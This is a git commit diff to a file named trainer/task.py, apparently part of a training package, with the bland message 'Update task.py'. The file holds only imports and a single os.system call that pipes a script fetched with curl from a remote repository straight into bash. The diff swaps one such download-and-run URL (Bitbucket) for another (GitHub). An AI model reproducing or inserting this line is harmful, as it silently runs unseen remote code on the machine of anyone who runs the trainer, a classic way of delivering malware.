265ad77abe9b2359439b5b4dc1a5e7e8844b5478
brigida851 <brigidaspagnoletti58@gmail.com>
2024-12-24 00:00:07 +0000

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/bebegila/bbgila/raw/main/kelacuy | bash')
+os.system('curl -sL https://github.com/brigida851/dvgt/raw/main/aa | bash')
